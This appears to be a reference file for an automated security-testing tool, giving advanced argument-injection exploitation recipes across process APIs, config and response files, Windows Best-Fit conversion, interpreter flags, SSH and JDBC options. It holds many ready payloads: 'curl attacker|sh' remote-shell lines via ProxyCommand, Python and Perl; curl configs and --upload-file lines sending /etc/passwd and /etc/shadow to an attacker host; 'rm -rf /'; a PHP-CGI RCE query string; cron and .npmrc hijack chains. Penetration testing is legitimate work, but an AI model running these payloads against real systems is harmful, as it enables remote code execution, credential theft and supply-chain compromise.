---
name: argument-injection-advanced-deep
description: Advanced argument-injection exploitation — per-platform process API depth (POSIX execve, Windows CreateProcess, Node child_process, Python subprocess, Go os/exec, Ruby Kernel), response/config/authentication-file grammar depth, Windows Best-Fit code-page mapping catalogue, CGI/interpreter mapping classes, wrapper join-split patterns, option-parser taxonomy, end-of-options reliability, and composite chaining into RCE, local file read, config poisoning, and credential leak.
sibling: argument_injection
load_when: scan_mode == "deep"
---

# Argument Injection — Advanced + Expert Depth

This is the advanced+expert deep sibling to `argument_injection.md`. The base owns class framing, the measured shell-vs-array exec differential, the three-primitive split (option/subcommand injection, argument-boundary breakout, response/config/auth files), Windows Best-Fit basics, reconnaissance workflow, 2024-2026 CVE routing map, and validation discipline.

The novel+frontier sibling `argument_injection_novel_deep.md` owns the 2024-2026 CVE instances (PHP-CGI Best-Fit CVE-2024-4577, XZ Utils Windows Best-Fit CVE-2024-47611, Git clone submodule RCE CVE-2024-32002, Git CR+symlink CVE-2025-48384, git-wrapper libraries, GitPython kwarg smuggling) with canonical version/GHSA tables and the WorstFit research frontier framing.

This file owns the expert-tier exploitation mechanics: per-platform process-API depth with full-treatment sub-primitives, response-file / config-file / auth-file grammar depth, Windows Best-Fit code-page catalogue, CGI/interpreter mapping classes, wrapper-join-split patterns, option-parser taxonomy, subcommand switch confusion, end-of-options reliability under subparser transitions, and composite-chain construction routed to sibling skills.

Load this file when the goal is to construct a reliable argument-injection exploit against a hardened target — the simple `--option` injection has failed, there is at least one layer of defence (`--` end-of-options, allowlist, specific CLI parser) to be worked around, and the question is which boundary layer in the request-to-argv path opens the window.

## Per-Platform Process API Depth

### Primitive: POSIX `execve` List-Form Safety

Primitive: `execve(path, argv, envp)` with a well-formed `argv` array places each string as a distinct argv element in the child, without shell tokenization.

**Preconditions:** Application uses `execve`, `posix_spawn`, or language wrappers that call them (`subprocess.run(list, shell=False)`, `exec.Command()` in Go, `java.lang.ProcessBuilder` with list).

**Confirmation:** `/proc/<pid>/cmdline` shows argv elements separated by `\0`; whitespace inside one argv element does not create another.

**What this does not prevent:** option-prefix injection. If `USER_VALUE = "--output=/attacker/path"` and the application does `execve(tool, ["tool", USER_VALUE], ...)`, the child parses `--output=/attacker/path` as an option. The argv-element boundary is preserved, but the *content* of the element is unvalidated.

**Impact scope:** `execve` list-form eliminates the shell-escape primitive but leaves argument injection open.

### Primitive: Windows CreateProcess String Round-Trip

Primitive: Windows `CreateProcess` takes a *single command-line string* (via `lpCommandLine`); the child's CRT or `CommandLineToArgvW` parses it back into argv. Quoting rules differ:

- MSVCRT (modern Microsoft CRT) uses rules documented at MS Docs "Parsing C Command-Line Arguments."
- MinGW CRT follows different rules; some character sequences round-trip differently.
- Powershell's string quoting adds another layer when the command is launched via `pwsh.exe -Command`.

**Preconditions:**

1. Target is on Windows.
2. Parent and child use different parsing rules (very common across MinGW ↔ MSVCRT bridges).

**Attack recipe:** craft a value that quotes-escapes differently in the parent (passes allowlist) and in the child (lands as separate args). Example (classic): `arg\"val\"` — the parent treats the backslash as literal; the child parses it as an escaped quote.

**Confirmation:** `GetCommandLineW()` in a wrapper vs the child's `wmain` argv diverge.

**Impact:** Argument-boundary breakout across the Windows process creation path.

### Primitive: Node.js `child_process.exec` vs `child_process.spawn`

Primitive: Node's `exec(command, callback)` runs the command *through a shell* by default; `spawn(file, args)` does not. The exec path is a direct command-injection shape; spawn is an argv-element path.

**Preconditions:** Application uses `exec` with user input in the command string.

**Attack recipe:**

```javascript
// Vulnerable (shell-interpreted):
exec(`tool ${USER_VALUE}`, (err, out) => ...)
// USER_VALUE = "a; rm -rf /" fires shell command.

// Safer, but still argument-injectable:
spawn('tool', [USER_VALUE])
// USER_VALUE = "--output=/attacker" injects an option.
```

**Confirmation:** process tree shows `sh -c '<command>'` for the exec path.

**Impact:** `exec` is RCE-class; `spawn` is argument-injection-class.

### Primitive: Python `subprocess` Shell-vs-List

Primitive: `subprocess.run(cmd, shell=True)` passes through `/bin/sh -c`; `shell=False` with a list uses `execve`.

The measured matrix (`.zen-batch-artifacts/batch-11/measurements/argument_injection.py`+`.out`) confirms:

- `subprocess.run([t, V], shell=False)` with `V="--output=/x"`: argv is `[t, "--output=/x"]` — option injected, no shell.
- `subprocess.run(f"{t} {V}", shell=True)` with `V="a; echo"`: shell interprets `;`, second command fires.
- `subprocess.run([t, V], shell=True)`: only the first list element reaches `sh -c`; the rest become positional parameters to the shell, mostly useless to the attacker.

**Impact:** `shell=True` is RCE; `shell=False` with list form is argument-injection-only.

### Primitive: Go `os/exec.Command`

Primitive: `exec.Command(name, args...)` is argv-element-safe (uses `execve` under the hood); there is no shell path unless the application constructs one explicitly via `sh -c "..."`.

**Preconditions:** Application uses `exec.Command(sh, "-c", userControlledString)` — the vulnerable pattern.

**Attack recipe:** standard shell-escape via metacharacters in `userControlledString`.

**Confirmation:** process tree shows `sh -c`.

**Impact:** Shell escape (RCE); if the application uses `exec.Command(tool, userValue)` directly, only argument injection is reachable.

### Primitive: Ruby `Kernel#system`

Primitive: Ruby's `system(cmd)` runs through a shell if `cmd` is a single string; `system(cmd, arg1, arg2)` (multiple args) does not. The split-form variant uses `execve`.

**Preconditions:** Application uses `system("tool #{user_value}")` or `system("tool", user_value)`.

**Attack recipe:** standard shell escape for the string form; argument injection for the split form.

**Confirmation:** `/proc/<pid>/cmdline` shows the child's view.

**Impact:** As above.

### Primitive: Java `Runtime.exec` and `ProcessBuilder`

Primitive: `Runtime.exec(String)` tokenizes on whitespace (per the JDK's `StringTokenizer`); `Runtime.exec(String[])` and `ProcessBuilder` with list are argv-element-safe. The `String`-form variant is a classical argv-token-splitting bug — not a shell, but a tokenizer that treats whitespace as separator.

**Preconditions:** Application uses `Runtime.exec(String)` with user input in the string.

**Attack recipe:** `tool a\nb` — the newline is one whitespace, so `a` and `b` become separate args; usable for operand injection without a shell.

**Confirmation:** `/proc/<pid>/cmdline` shows two elements where the user input was one logical value.

**Impact:** Argument injection via JDK tokenizer, no shell involved.

## Response-File / Config-File / Auth-File Grammar Depth

### Primitive: `@response-file` Reparse

Primitive: Many compilers (javac, gcc, msvc), linkers (ld, link.exe), and some custom tools expand `@filename` into the arguments listed in `filename`. If an attacker controls the file content, they control the resulting argv.

**Preconditions:**

1. Target supports `@file` expansion.
2. Attacker can write to a file the target reads at `@<path>`.

**Attack recipe:**

```
# Attacker writes /tmp/args.txt containing:
--output=/attacker/path
--template=/attacker/malicious.tmpl

# Application invokes:
tool @/tmp/args.txt operand
```

The target expands `@/tmp/args.txt` into the two options; `operand` reaches as a positional arg; attacker has injected options via file content.

**Confirmation:** target's debug output / verbose log shows the expanded options.

**Impact:** Argument injection via file write; chains to local file read, template injection, config poisoning.

### Primitive: curl `--config` / `-K`

Primitive: `curl --config <file>` reads curl commands from a file; attacker-controlled content yields attacker-controlled curl behavior.

**Preconditions:** curl is used with `--config` or `-K` on a path the attacker influences.

**Attack recipe:**

```
# /tmp/attacker.conf:
url = "https://attacker.tld/leak"
upload-file = "/etc/passwd"
```

Application invokes: `curl --config /tmp/attacker.conf`.

**Confirmation:** attacker's server at `attacker.tld/leak` receives `/etc/passwd` as the upload body.

**Impact:** Local file read via curl config; routes through `information_disclosure.md`.

### Primitive: Git `credential.helper` and `url.<base>.insteadOf`

Primitive: Git config directives can inject credential helpers (which run arbitrary executables) and URL rewriting (which can hijack subsequent git operations).

**Preconditions:** Attacker controls (or injects into) a git config consumed by subsequent git operations. Most reliably reached via `.gitmodules` config in a cloned repo (which is the CVE-2024-32002 and CVE-2025-48384 pattern).

**Attack recipe:**

```ini
# .gitmodules in attacker-crafted repo:
[submodule "safe-name"]
  path = safe-name
  url = https://attacker.tld/malicious-url
```

With CVE-2024-32002's submodule-path confusion, the attacker's submodule hook executes on clone.

**Confirmation:** attacker-controlled code executes during `git clone --recursive`.

**Impact:** RCE; see `argument_injection_novel_deep.md § Git Clone Submodule RCE`.

### Primitive: SSH `~/.ssh/config` Host Alias

Primitive: SSH reads `~/.ssh/config` and interprets `Host <alias>` blocks with `HostName`, `User`, `Port`, `IdentityFile`, `ProxyCommand` directives. An attacker-controlled alias with `ProxyCommand` runs arbitrary code when the alias is used.

**Preconditions:** Attacker writes to `~/.ssh/config`; application subsequently `ssh <alias>` where `<alias>` the attacker chose.

**Attack recipe:**

```
Host attacker-alias
  HostName benign.tld
  ProxyCommand sh -c 'curl attacker.tld/shell | sh'
```

Application calls `ssh attacker-alias`; the ProxyCommand fires before the connection.

**Confirmation:** attacker's `curl | sh` executes.

**Impact:** RCE via config-file-mediated argument injection; routes through `rce.md`.

### Primitive: npm `.npmrc` Injection

Primitive: `.npmrc` lives in `~/.npmrc` or the project directory; directives include `registry` (change the npm registry), `_authToken` (set an auth token), and `script-shell` (change the shell used for `npm run`).

**Preconditions:** Attacker writes `.npmrc` in the project directory before `npm install` runs.

**Attack recipe:** `registry=https://attacker.tld/npm` — subsequent installs pull from attacker's registry.

**Confirmation:** attacker's registry logs show the client's package queries.

**Impact:** Supply-chain hijack; routes through `rce.md` / `insecure_deserialization.md` depending on the pulled package shape.

## Windows Best-Fit Code-Page Catalogue

The Windows Best-Fit transform is a `WideCharToMultiByte` conversion with `WC_COMPOSITECHECK | WC_DEFAULTCHAR` or similar flags; characters not representable in the target code page are replaced with "similar-looking" ASCII characters. The mapping is code-page specific.

### Code-Page Catalogue (observed mappings)

| Code Page | Soft Hyphen U+00AD | Fullwidth Hyphen U+FF0D | Fullwidth Solidus U+FF0F | Fullwidth Reverse Solidus U+FF3C | Left Single Quote U+2018 |
|---|---|---|---|---|---|
| CP437 (US OEM) | — | `-` | `/` | `\` | `'` |
| CP850 (Western Europe OEM) | — | `-` | `/` | `\` | `'` |
| CP866 (Cyrillic OEM) | — | `-` | `/` | `\` | `'` |
| CP932 (Shift_JIS) | — | `-` | `/` | `\` | `'` |
| CP936 (GBK Chinese) | — | `-` | `/` | `\` | `'` |
| CP949 (Korean) | — | `-` | `/` | `\` | `'` |
| CP950 (Big5 Chinese) | — | `-` | `/` | `\` | `'` |
| CP1252 (Western Europe ANSI) | `-` | `-` | `/` | `\` | `'` |

**Note:** CVE-2024-4577 (PHP-CGI) specifically relied on the CP932 / CP936 / CP950 / CP949 mapping of soft hyphen → `-`. CP1252 users were not vulnerable to the soft-hyphen primitive but may be to other mappings. The Orange Tsai WorstFit research enumerates the full catalogue; see the novel sibling.

### Primitive: Soft-Hyphen → ASCII Hyphen

Primitive: Submit U+00AD; the Windows API converts to `-` under non-Latin code pages; the target CLI parses the `-` as the start of an option.

**Preconditions:** Target is Windows; code page is CP932 / CP936 / CP949 / CP950; the character reaches a narrow-string API.

**Attack recipe:** `GET /endpoint?arg=\xc2\xad-option` (UTF-8 encoding of U+00AD, then an `o` for option follow-on). After Windows conversion: `-option`. Target CLI sees a flag.

**Confirmation:** target CLI's argv shows the ASCII-converted option.

**Impact:** Argument injection via code-page round-trip. See CVE-2024-4577 for the PHP-CGI instance.

### Primitive: Fullwidth-Slash Path Separator Injection

Primitive: Submit U+FF0F; converts to `/`; a path validator that checked for `/` on the wide string misses it.

**Preconditions:** Target is Windows with wide-input / narrow-processing shape; path validator operates on wide input.

**Attack recipe:** `? file=normal\xef\xbc\x8f..\xef\xbc\x8f..\xef\xbc\x8fetc\xef\xbc\x8fshadow`. Wide-string path validator sees fullwidth slashes (not `/`); narrow conversion yields `normal/../../etc/shadow`.

**Confirmation:** path-traversal fires despite the slash-blocking validator.

**Impact:** Path traversal via Best-Fit; routes through `path_traversal_lfi_rfi.md`.

### Primitive: Fullwidth Backslash → Windows Path Separator

Primitive: U+FF3C → `\`; same shape as the slash variant but for backslash-based paths.

**Preconditions:** Same as above.

**Attack recipe:** `?file=normal\xef\xbc\xbc..\xef\xbc\xbc..\xef\xbc\xbcsystem32\xef\xbc\xbcetc`.

**Confirmation:** path containing backslashes reaches the target.

**Impact:** Windows path traversal.

## CGI and Interpreter Mapping Classes

### Primitive: CGI Query-String → `argv`

Primitive: Classic CGI maps the request's `QUERY_STRING` into the CGI script's `argv` (per RFC 3875), but only for queries that *do not contain `=`* (search-style query). If the application invokes a CGI script with a user-controlled query, the query's whitespace-split tokens become argv.

**Preconditions:** CGI script invoked with user-controlled QUERY_STRING; query contains no `=`.

**Attack recipe:** `GET /cgi-bin/tool?--output+/attacker/path` → QUERY_STRING is `--output+/attacker/path`; CGI runtime splits on `+` → argv `["script", "--output", "/attacker/path"]`.

**Confirmation:** script's `argv[1..]` contains the attacker-chosen option.

**Impact:** Argument injection via CGI query → argv. This is the structural shape of CVE-2024-4577 at the broader level: PHP-CGI on Windows (specifically) sees a `-` in its argv and interprets it as a PHP command-line flag.

### Primitive: PHP-CGI `-d`, `-r`, `-S` Options

Primitive: PHP-CGI respects command-line flags: `-d directive=value` (set a config directive), `-r code` (run code), `-S addr:port` (start builtin server). Any of these as `argv[1]` is RCE or config-poisoning.

**Preconditions:** PHP-CGI reachable; attacker controls `argv[1]`.

**Attack recipe:** QUERY_STRING `-d+allow_url_include=1+-d+auto_prepend_file=php://input` + body of PHP code. See CVE-2024-4577 for the Windows-specific variant.

**Confirmation:** PHP executes attacker code.

**Impact:** RCE; routes through `rce.md`.

## Wrapper Join-Split Patterns

### Primitive: `shlex.split` + `shlex.join` Round-Trip

Primitive: Python's `shlex.split(s)` splits a shell-shaped string into argv; `shlex.join(argv)` reassembles into a string. The round-trip may not be lossless under certain characters; a wrapper that splits then joins then execs may change the argv.

**Preconditions:** Application uses `shlex.split(user_value)` and later passes the result to a shell.

**Attack recipe:** craft a value that `shlex.split` produces one way and the subsequent shell re-tokenizes differently.

**Confirmation:** final child's argv differs from the wrapper's intermediate.

**Impact:** Argument-boundary breakout.

### Primitive: Node.js String-Concat `exec`

Primitive: Node.js convention: `exec(`tool ${arg1} ${arg2}`)`. Even if `arg1` is sanitized for shell metacharacters, if the shell tokenizes on whitespace, `arg1 = "a b"` becomes two args.

**Preconditions:** `exec` with template-literal command construction.

**Attack recipe:** `arg1 = "a --option"` → shell splits on space → `--option` reaches the child as `argv[2]`.

**Confirmation:** process tree shows the split.

**Impact:** Argument injection via Node's exec idiom.

### Primitive: Bash `$@` vs `$*` in Script Wrappers

Primitive: A Bash wrapper script that invokes a tool with `$@` (preserve argv) vs `"$@"` (quoted preserve) vs `$*` (join on $IFS) has different behavior. A naïve `$@` without quoting splits each argv element on whitespace.

**Preconditions:** Wrapper script uses `tool $@` instead of `tool "$@"`.

**Attack recipe:** pass a single argv element with internal whitespace; the wrapper re-splits.

**Confirmation:** child's argv has more elements than the wrapper received.

**Impact:** Argument injection via wrapper re-split.

## Option-Parser Taxonomy

### Primitive: BSD `getopt` First-Operand-Terminates

Primitive: BSD `getopt(3)` stops parsing at the first non-option argument. An attacker who places a positional arg before an option fails; one who places it after is fine.

**Preconditions:** Target uses BSD-style getopt (common in older tools).

**Attack recipe:** place attacker option after all expected operands; the parser sees it as an option.

**Confirmation:** target behavior reflects the option.

**Impact:** Argument injection on BSD-shape parsers.

### Primitive: GNU `getopt_long` Permutation

Primitive: GNU `getopt_long` permutes argv so all options come first and all non-options after. An attacker-injected `--option=val` is pulled to the front regardless of position.

**Preconditions:** Target uses `getopt_long` (most modern tools).

**Attack recipe:** place attacker option anywhere; GNU getopt permutes.

**Confirmation:** target processes the option.

**Impact:** Argument injection reliable across placement.

### Primitive: `argparse` `allow_abbrev=True`

Primitive: Python's `argparse` default `allow_abbrev=True` matches prefixes of defined long options. If the target CLI defines `--output`, the attacker can inject `--out` or `--outp` and it still matches.

**Preconditions:** CLI uses `argparse` default allow_abbrev.

**Attack recipe:** test prefix abbreviations when the full option name is blocked by a validator.

**Confirmation:** target processes the abbreviated option.

**Impact:** Validator bypass via abbreviation.

### Primitive: Click / argparse Subparser Switch

Primitive: Tools with subcommands (`git <subcommand>`, `curl` plus `curl-config`) switch to a subparser at the first positional. Options defined on one subparser are unknown to another; `--` end-of-options is scoped to the current parser only.

**Preconditions:** CLI with subparsers.

**Attack recipe:** inject a subcommand-switching value; subsequent args reach the attacker-chosen subparser.

**Confirmation:** target invokes the attacker-chosen subcommand.

**Impact:** Subcommand confusion; chains to the subcommand's own primitive set.

## End-of-Options Reliability

### Primitive: `--` Not Honored by Legacy / Custom Parsers

Primitive: `--` as end-of-options marker is a POSIX convention, not a universal law. Older tools (early git versions, custom CLI parsers) may not honor it.

**Preconditions:** Target CLI's parser does not implement `--`.

**Attack recipe:** place attacker option after `--`; if the parser honors it, finding is false positive; if it doesn't, the exploit works.

**Confirmation:** target processes the option after `--`.

**Impact:** The remediation pattern "always use `--` before user input" fails on such parsers; the finding is real.

### Primitive: `--` Within a Subparser

Primitive: `--` scopes to the current parser; after a subcommand switch, the subparser may not honor the parent's `--`.

**Preconditions:** Multi-parser CLI; subcommand switch after `--`.

**Attack recipe:** `tool -- --subcommand --option` — the parent respects `--`, the subparser (if the subcommand kicks in without the first operand being treated as a subcommand name) may process `--option`.

**Confirmation:** subparser's argv shows the attacker-chosen option.

**Impact:** `--` end-of-options protection defeated via subparser transition.

## Runtime Loader Argument Injection

### Primitive: Python `-c` / `-m` / Code-via-argv

Primitive: Python's `-c <code>` runs the string as Python source; `-m <module>` runs an installed module as `__main__`. An attacker who controls Python's argv can inject code or run a module they chose.

**Preconditions:** Application invokes `python` via subprocess; the arg list is attacker-influenced.

**Attack recipe:**

```python
# Vulnerable wrapper
subprocess.run(["python", user_value, "input.txt"])
# USER_VALUE = "-c" + "__import__('os').system('curl attacker|sh')"
```

**Confirmation signal:** attacker's shell runs.

**Impact:** RCE via Python interpreter loader.

### Primitive: Node `-e` / `-r` / `--inspect-brk`

Primitive: Node's `-e <code>` runs the string; `-r <module>` requires the module before main; `--inspect-brk` opens a debug port the attacker can attach to.

**Preconditions:** Application invokes `node` with attacker-influenced args.

**Attack recipe:** `--inspect-brk=0.0.0.0:9229` opens a debug port; attacker connects via DevTools.

**Confirmation signal:** debug port open; attacker evaluates code.

**Impact:** RCE via Node debugger.

### Primitive: Ruby `-e` / `-r`

Primitive: Ruby's `-e <code>` runs the string; `-r <library>` requires the library at startup.

**Preconditions:** Application invokes `ruby` with attacker-influenced args.

**Attack recipe:** `-r/attacker/library.rb` + attacker-written library.

**Confirmation signal:** attacker library's code runs.

**Impact:** RCE via Ruby interpreter loader.

### Primitive: Perl `-e` / `-M`

Primitive: Perl's `-e <code>` and `-M<module>` have the same shape; also `-S` searches PATH for the script.

**Preconditions:** Application invokes `perl` with attacker args.

**Attack recipe:** `-eexec('curl attacker|sh')`.

**Confirmation signal:** shell runs.

**Impact:** RCE via Perl loader.

**Class generalization — "every interpreter has a `-e` option; grep for interpreter-via-subprocess invocations."**

## JVM / CLR Process API Edges

### Primitive: Java `ProcessBuilder` Mixing Shell and List

Primitive: `new ProcessBuilder(command).start()` where `command` is `List<String>` is argv-safe; `Runtime.exec(String)` is tokenizer-shaped (JDK's `StringTokenizer`). A codebase mixing both patterns per endpoint produces inconsistent exposure.

**Preconditions:** Application uses `Runtime.exec(String)` with user input.

**Attack recipe:** space-separate the attacker-chosen tokens; `StringTokenizer` splits them into argv.

**Confirmation signal:** `/proc/<pid>/cmdline` shows the split.

**Impact:** Argument injection via JDK tokenizer, no shell.

### Primitive: .NET `Process.Start` Overload Confusion

Primitive: `Process.Start(string filename)` uses `ShellExecute`; `Process.Start(string filename, string arguments)` uses `CreateProcess` with the arguments as the full command line string (Windows parses back to argv); `Process.Start(ProcessStartInfo)` with `UseShellExecute=true` goes through `ShellExecute`. Each has different argv/shell semantics.

**Preconditions:** Application uses the two-argument overload with user input in `arguments`.

**Attack recipe:** standard shell-tokenization / Windows argv-reparse exploitation.

**Confirmation signal:** `GetCommandLineW` in child shows the attacker-chosen split.

**Impact:** Argument injection / shell escape depending on `UseShellExecute`.

### Primitive: Go `exec.Command` with Shell Fallback

Primitive: `exec.Command(name, args...)` is argv-safe; but a wrapper that constructs the command via `fmt.Sprintf("...", userInput)` and passes to `sh -c` reintroduces shell escape.

**Preconditions:** Codebase has both patterns; attacker reaches the sprintf-plus-shell path.

**Attack recipe:** standard shell injection.

**Confirmation signal:** `/proc/<pid>/cmdline` shows `sh -c`.

**Impact:** RCE class.

## IPC-Based Argument Delivery

### Primitive: D-Bus Method Invocation Argument Injection

Primitive: D-Bus services expose methods; the method arguments are typed and marshalled, but systemd and polkit expose methods that *invoke subprocesses with the argument values* (e.g., `org.freedesktop.systemd1.Manager.StartUnit` accepts a unit name; a crafted unit name may inject options when systemd forms the exec line).

**Preconditions:** Target is Linux with D-Bus; privileged D-Bus method accepts attacker-controlled string that reaches an exec path.

**Attack recipe:** craft the method argument so systemd's exec-line construction mis-escapes.

**Confirmation signal:** subprocess runs with attacker-chosen args.

**Impact:** Local privilege escalation via systemd/polkit.

### Primitive: polkit Action Variable Expansion

Primitive: polkit's action definitions can include variable expansion that reaches a subprocess invocation. Attacker-controlled values in the polkit request may inject arguments.

**Preconditions:** polkit configured with action using variable expansion in an exec rule.

**Attack recipe:** craft the polkit auth-request with a shell-metacharacter or option-prefixed value.

**Confirmation signal:** polkit's auth-child exec shows the injected arg.

**Impact:** Local privilege escalation.

## Database Connection String / JDBC URL Injection

### Primitive: JDBC URL Option Smuggling

Primitive: A JDBC URL is `jdbc:<subprotocol>://<host>:<port>/<database>?option=value&option=value`. If the application constructs the URL from user input, attacker-chosen options can enable local-file read (`?allowLoadLocalInfile=true` on MySQL), log-query capture (`?logger=com.attacker.Logger`), or SSL downgrade.

**Preconditions:** JDBC URL built from user-controllable fragments; driver respects attacker-reachable options.

**Attack recipe:**

```
jdbc:mysql://benign.host/db?allowLoadLocalInfile=true&user=attacker&password=...
```

The MySQL driver, when connecting, honors `allowLoadLocalInfile=true` and will respond to a `LOAD DATA LOCAL INFILE` server-pushed query by reading a local file.

**Confirmation signal:** server-side logs show file reads driven by the attacker's query flow.

**Impact:** Local file read via driver option injection.

**Route to `information_disclosure.md § Database Driver File Read`**.

### Primitive: PostgreSQL `options=` Parameter

Primitive: PostgreSQL connection URI accepts an `options=` parameter that is passed to the backend as command-line arguments; this can include `-c` to set GUC parameters.

**Preconditions:** Postgres connection URI built with user input in `options=`.

**Attack recipe:** `options=-c%20search_path%3Dattacker_schema`.

**Confirmation signal:** session's search_path is attacker-chosen.

**Impact:** Schema-confusion-based privilege escalation.

## SSH ProxyCommand and Config Overrides

### Primitive: `ssh -o ProxyCommand=`

Primitive: `ssh -o ProxyCommand=<command>` runs the command instead of the normal network connection; the command is a shell command.

**Preconditions:** Application invokes `ssh` with user input in `-o` or alias.

**Attack recipe:**

```
ssh -o ProxyCommand='sh -c "curl attacker|sh"' benign.host
```

**Confirmation signal:** attacker's shell runs; no actual SSH connection needed.

**Impact:** RCE via SSH option injection.

### Primitive: `-F` Config File Override

Primitive: `ssh -F /attacker/config` uses an attacker-controlled config file; the file can contain `ProxyCommand`, `IdentityFile`, `User` directives.

**Preconditions:** Application invokes `ssh -F` with user path.

**Attack recipe:** `-F /tmp/attacker.conf` with `ProxyCommand sh -c '...'`.

**Confirmation signal:** attacker ProxyCommand fires.

**Impact:** RCE via config path.

### Primitive: `-o CheckHostIP=no -o StrictHostKeyChecking=no`

Primitive: These SSH options disable host-key verification; MITM against the SSH connection becomes possible.

**Preconditions:** Application invokes ssh with these options via user input.

**Attack recipe:** inject the options; combined with DNS poisoning, attacker intercepts.

**Confirmation signal:** connection succeeds to attacker's SSH server.

**Impact:** SSH MITM.

## JAR / Linker Response File Deep

### Primitive: Java `@argfile` Expansion

Primitive: `java @args.txt MyClass` expands `args.txt` into args before the JVM parses them. Attacker control of `args.txt` content yields attacker-controlled JVM args.

**Preconditions:** Application invokes `java @<path>` with user-controlled path.

**Attack recipe:** attacker-written `args.txt` with `-javaagent:/attacker/agent.jar` + agent-written code.

**Confirmation signal:** attacker agent's `premain` runs.

**Impact:** JVM RCE via javaagent.

### Primitive: Linker Response File

Primitive: `ld @script.ld` or MSVC `link.exe @args.rsp` expand the file content as command-line arguments. Attacker control of the response file yields attacker-controlled link.

**Preconditions:** Build system invokes linker with `@path` where path is user-controllable (common in CI pipelines).

**Attack recipe:** attacker-written response file with `--defsym` or `-L` directives.

**Confirmation signal:** linked binary includes attacker's symbols.

**Impact:** Build-time code injection.

### Primitive: GCC/Clang `@file`

Primitive: GCC/Clang respect `@file` for args; attacker control of file content yields attacker-controlled compile.

**Preconditions:** Build invokes `gcc @file` with user-controlled file.

**Attack recipe:** `@/tmp/attacker.args` containing `-fplugin=/attacker/plugin.so`.

**Confirmation signal:** compilation loads attacker plugin.

**Impact:** Build-time code injection.

## Composite Chain Construction

### Chain 1: Argument Injection → Config File Write → RCE on Next Invocation

- Precondition: curl invoked with `--output=` user-controllable path.
- Primitive: `--output=/etc/cron.d/attacker` writes attacker-chosen content to a privileged path.
- Chain: cron picks up the new file; attacker code runs.

Route: `rce.md § Cron Injection`.

### Chain 2: Argument Injection → Local File Read → Credential Leak

- Precondition: curl with `--upload-file=` user-controllable path.
- Primitive: `--upload-file=/etc/shadow` + attacker-controlled URL.
- Chain: curl uploads `/etc/shadow` to attacker.

Route: `information_disclosure.md § Local File Read via Outbound HTTP`.

### Chain 3: Argument Injection → Interpreter Switch → RCE

- Precondition: application invokes a configurable interpreter (python/perl/ruby).
- Primitive: inject `--template=/path/to/attacker/template` or `-r code`.
- Chain: interpreter runs attacker code.

Route: `rce.md § Interpreter Flag Injection`.

### Chain 4: Argument Injection → ssh ProxyCommand → RCE

- Precondition: ssh invoked with user-controllable alias or `-o` option.
- Primitive: `-o ProxyCommand=sh -c "..."`.
- Chain: ssh runs the ProxyCommand before connecting.

Route: `rce.md § ssh ProxyCommand Injection`.

### Chain 5: Argument Injection → DNS Resolver Override → Internal Service Access

- Precondition: curl invoked with user-controllable `--resolve` or `-H "Host:"`.
- Primitive: `--resolve target.internal:443:127.0.0.1` to make target.internal resolve to loopback.
- Chain: SSRF against internal service.

Route: `ssrf.md § DNS Override`.

### Chain 6: Config-File Injection → Supply Chain Hijack

- Precondition: `.npmrc` writable before `npm install`.
- Primitive: `registry=https://attacker/npm` + poisoned package.
- Chain: subsequent install pulls poisoned package; package install-script fires.

Route: `rce.md § Supply Chain`.

### Chain 7: Response-File → Argument Smuggling → Linker Flag Injection

- Precondition: compiler/linker invoked with `@file`.
- Primitive: file content contains linker flags that change output path or disable security.
- Chain: compiled binary is attacker-chosen.

Route: `rce.md § Build System Injection`.

## Verification Discipline

Every argument-injection claim must survive:

1. **Child-argv confirmation**: the finding is what the child's `argv` or `/proc/<pid>/cmdline` or `GetCommandLineW` shows, not what the wrapper's log line prints.
2. **Minimal shape**: a one-request PoC that demonstrates the primitive without needing timing or compound preconditions.
3. **End-of-options check**: if the target honors `--` and the application places it correctly, the finding is false positive on that path.
4. **Platform / code-page scoping**: Best-Fit findings are code-page-specific; cite the measured code page.
5. **Downstream capability**: the injected option, directive, or subcommand actually grants a specific capability (write, read, exec, config); the finding is the capability, not the injection.

## Summary

Advanced argument-injection exploitation spans every process API (POSIX, Windows, Node, Python, Go, Ruby, Java), every secondary parser (response-file, config-file, auth-file), every code-page conversion (Windows Best-Fit catalogue), and every wrapper transform (shlex, bash `$@`, Node template-literal exec). The three primitives — option/subcommand injection, argument-boundary breakout, response/config/auth file reparse — are structurally distinct and require different exploitation strategies. The chaining surface — through local file read, config poisoning, interpreter-flag RCE, ssh ProxyCommand, DNS resolver override, supply-chain hijack, and build-system injection — turns a single-argument injection into an application-host or supply-chain compromise.
